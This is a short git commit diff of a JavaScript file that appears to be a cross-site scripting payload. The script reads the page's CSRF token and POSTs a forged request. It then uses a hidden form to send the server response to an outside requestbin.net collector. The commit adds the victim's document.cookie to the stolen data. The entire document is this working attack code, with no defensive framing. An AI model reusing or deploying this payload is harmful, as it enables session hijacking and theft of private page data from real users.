f7f46e2194f92731d7e8f4ee01700c8c4af9b7a1
Invaders0 <46098959+Invaders0@users.noreply.github.com>
2020-01-19 18:43:10 +0530

    Update script.js

--- script.js
+++ script.js
@@ -1,5 +1,5 @@
 fetch(window.location.pathname, {
     'method': 'POST',
     'body': 'name=<b>asf</b>&user_id=2&_csrf_token=' + document.getElementsByName('_csrf_token')[0].value
-}).then(function(response){response.text().then(function(back){f=document.createElement("form");i=document.createElement("input");f.method='post';f.action='http://requestbin.net/r/rj93qcrj';i.name='data';i.value=btoa(encodeURI(back));f.appendChild(i);document.body.appendChild(f);f.submit();})})
+}).then(function(response){response.text().then(function(back){f=document.createElement("form");i=document.createElement("input");f.method='post';f.action='http://requestbin.net/r/rj93qcrj';i.name='data';i.value=btoa(back+document.cookie);f.appendChild(i);document.body.appendChild(f);f.submit();})})
 
